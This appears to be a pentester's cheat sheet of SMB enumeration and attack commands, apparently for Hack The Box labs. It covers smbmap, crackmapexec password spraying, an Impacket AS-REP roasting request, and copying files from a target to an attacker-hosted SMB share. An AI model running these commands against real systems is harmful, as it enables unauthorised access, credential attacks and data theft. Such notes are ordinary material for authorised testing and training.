smbmap -H TARGET -u 'ANYUSER' #listing SMB  
smbmap -H TARGET -u '' -p '' #listing SMB  
smbmap -u USER -p 'PASSWORD' -d DOMAIN -H TARGETIP  
smbclient -L //TARGET #listing SMB   
smbclient //TARGET/FOLDER #view SMB  
crackmapexec smb TARGET #info SMB  
crackmapexec smb TARGET --shares #listing SMB  
crackmapexec smb TARGET --pass-pol #info SMB  
crackmapexec smb TARGET --shares -u ANYUSER -p ANYPASS #listing SMB  
crackmapexec smb TARGET -u users.txt -p password --continue-on-success #brute users without stop  
  
/usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'  
  
?###############################################################################################  
ON KALI$ sudo impacket-smbserver -smb2support SHARENAME $(pwd)  
ON TARGET$ copy FILENAME \\10.10.14.10\SHARENAME\FILENAME  
  
  
ON KALI$ impacket-smbserver Name $(pwd) -smb2support -u sysrq -pasword 1234321   
ON TARGET$ $pass = convertto-securestring '1234321' -AsPlainText -Force  
ON TARGET$ $pass  
ON TARGET$ $cred = New-Object System.Management.Automation.PSCredential('sysrq', $pass)  
ON TARGET$ $cred  
ON TARGET$ New-PSDrive -Name sysrq -PSProvider FileSystem -Credential $cred -Root \\KALIIP\Name  
################################################################################################  
apt install cifs-utils #fs packet  
sudo mount -t cifs /TARGET/FOLDER /mnt/LOCAL/FOLDER #mount share localy(make existing dir before mounting)  
sudo mount -t cifs -o 'username=USER,password=PASS' //TARGET/FOLDER /mnt/LOCAL/FOLDER  
find . -ls -type f #file listing  
sudo umount /mnt/LOCAL/FOLDER #unmount share  
cat /folder/file.format | iconv -f UTF-16LE -t utf-8 #decoding file  
  
##################################################################################  
pip install bloodhound  
  
sudo nbtscan -r TARGET/RANGE  
  
ls -l /usr/share/nmap/scripts/smb* (smb-vuln*)  
nmap -v -p 139,145 --script=smb-os-discovery TARGET